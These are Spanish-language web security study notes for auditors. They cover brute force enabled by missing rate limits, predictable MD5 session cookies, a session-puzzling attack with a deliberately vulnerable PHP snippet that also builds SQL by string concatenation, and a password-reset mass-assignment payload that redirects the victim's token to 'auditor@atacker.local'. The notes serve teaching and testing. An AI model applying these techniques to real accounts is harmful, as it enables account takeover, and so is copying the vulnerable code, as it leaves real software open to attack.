-- -
# 1. ¿Qué es Rate Limiting?

El _Rate Limiting_ (Límitación de Tasa) es un mecanismo de control que restringe el número de peticiones HTTP que un usuario (o una dirección IP) puede realizar a una aplicación web en un periodo de tiempo determinado (por ejemplo, "máximo 5 intentos de login por minuto").

Si una aplicación no implementa esto, un auditor puede automatizar miles de peticiones por segundo utilizando herramientas como el **Intruder** de Burp Suite o scripts en Python.
# 2. Escenarios Comunes de Abuso:

- **Fuerza Bruta en Logins:** Probar miles de contraseñas para un solo usuario (`admin`) o realizar un ataque de _Password Spraying_ (probar una contraseña común como `Password123` contra miles de usuarios de la empresa)
- **Fuerza Bruta en Restablecimiento de Contraseña (Password Reset OTP):** Si la web te envía un código de 4 o 6 dígitos al móvil para cambiar la contraseña, y no hay límite de peticiones, puedes probar de forma secuencial desde el `0000` hasta el `9999` en pocos segundos y saltarte la validación.
- **Enumeración de Recursos:** Forzar la barra de búsqueda o identificadores para extraer datos masivos del sistema.
# 3. Vulnerabilidades de Autenticación y Gestión de Sesiones

La autenticación es el mecanismo para verificar quién eres; la gestión de sesiones es cómo la web recuerda quién eres en las siguientes peticiones. Aquí los desarrolladores cometen errores lógicos muy graves.
### A. Secuestro de Sesión por Predicibilidad (Session Fixation / Predictable Tokens)

Ocurre cuando los identificadores de sesión (Cookies o Tokens) no son lo suficientemente aleatorios.

- **Caso Histórico:** Aplicaciones antiguas que generaban la cookie de sesión haciendo un hash MD5 del nombre de usuario. Si tu usuario es `juan`, tu cookie es el MD5 de juan. Como auditor, simplemente calculas el MD5 de `admin` y modificas tu cookie en el navegador para entrar en su cuenta sin saber la contraseña.
### B. Session Puzzling (o Session Variable Overloading)

El **Session Puzzling** (enigmática de sesión) o **Sobrecarga de Variables de Sesión** ocurre cuando una aplicación web utiliza la misma variable de sesión en múltiples contextos o flujos lógicos independientes dentro de la aplicación, y el desarrollador no limpia ni reinicia adecuadamente el estado de esa variable.

En las aplicaciones web, las variables de sesión (como `$_SESSION['user_id']` en PHP o `req.session.email` en Node.js) se guardan de forma segura en la memoria del servidor. Sin embargo, si el servidor comparte una variable para dos propósitos distintos, el auditor puede entrelazar los flujos lógicos para engañar al sistema.
#### El Escenario Vulnerable (Paso a Paso)

Imagina una aplicación de portal de empleados con dos funciones independientes:

1. Flujo A: Proceso de Recuperación de Contraseña.

	- Introduces el correo de la víctima (`gerente@empresa.com`).
	- El servidor valida que el correo existe y guarda temporalmente en la sesión del servidor la variable: `$_SESSION['email'] = "gerente@empresa.com"`.
	- El sistema te dice: _"Te hemos enviado un código al correo"_. (Tú no tienes acceso al correo, por lo que te detienes aquí).

2. Flujo B: Panel de Configuración de Mi Perfil (Ya autenticado).

	- Inicias sesión con tu cuenta de usuario normal (`auditor@empresa.com`).
	- Vas a la sección de "Actualizar mi teléfono".
	- El código mal programado del backend hace esto:

```PHP
// El desarrollador asume que $_SESSION['email'] contiene el email de la sesión activa
$email_actual = $_SESSION['email'];
$db->query("UPDATE usuarios SET telefono = '$nuevo_tel' WHERE email = '$email_actual'");
```
#### El Ataque (Puzzle Lógico)

1. Abres una pestaña en tu navegador e inicias sesión con tu cuenta legítima (`auditor@empresa.com`).
2. En otra pestaña (compartiendo la misma sesión/cookie), entras al flujo de recuperar contraseña y pones el correo del `gerente@empresa.com`. El servidor sobrescribe la variable en memoria: `$_SESSION['email']` ahora es el del gerente.
3. Vuelves a la primera pestaña (tu perfil) y le das a guardar cambios. El backend leerá la variable de sesión envenenada (`gerente@empresa.com`) y actualizará el número de teléfono... **¡en la cuenta del gerente!** Has modificado datos de otro usuario abusando del desorden de variables en el servidor.
### C. Fallos lógicos en flujos de "Olvidé mi contraseña"

Es uno de los lugares favoritos para buscar bugs.

```
Flujo normal:
1. Pides recuperar contraseña de un correo.
2. El sistema genera un token único y te lo envía por email.
3. Haces clic y cambias la contraseña.
```
#### El Fallo de Lógica (Ejemplo Real de Auditoría):

Interceptas la petición `POST` al pedir el restablecimiento:

```HTTP
POST /api/v1/reset-password HTTP/1.1
Content-Type: application/json

{
	"email": "victima@correo.com"
}
```

Si modificas el JSON e inyectas un parámetro que el desarrollador no documentó, pero que el framework acepta (Mass Assignment), podrías redirigir el token:

```JSON
{
	"email": "victima@correo.com",
	"reply-to": "auditor@atacker.local"
}
```

Si el backend procesa ese parámetro secundario, el token secreto de la víctima llegará directamente al correo del auditor.
# 4. Mitigación

**Session Puzzling:** Limpiar explícitamente las variables de sesión (`session.destroy()` o desvincular variables específicas) inmediatamente después de que un flujo lógico o un asistente (wizard) termine o se cancele.
-- -
